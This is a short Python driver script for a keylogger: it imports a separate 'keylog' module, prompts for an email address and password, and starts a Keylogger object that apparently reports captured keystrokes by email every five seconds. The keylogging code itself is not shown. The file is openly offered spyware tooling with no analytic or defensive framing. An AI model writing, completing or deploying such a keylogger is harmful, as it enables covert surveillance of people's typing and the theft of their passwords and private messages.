#!/usr/bin/env python3
#use keylog.py file class
#import and create instance of class

import keylog
email = input("Enter email: ")
password = input("Enter email password: ")

my_keylogger = keylog.Keylogger(5, email, password) #pass value of 5 seconds
my_keylogger.start()
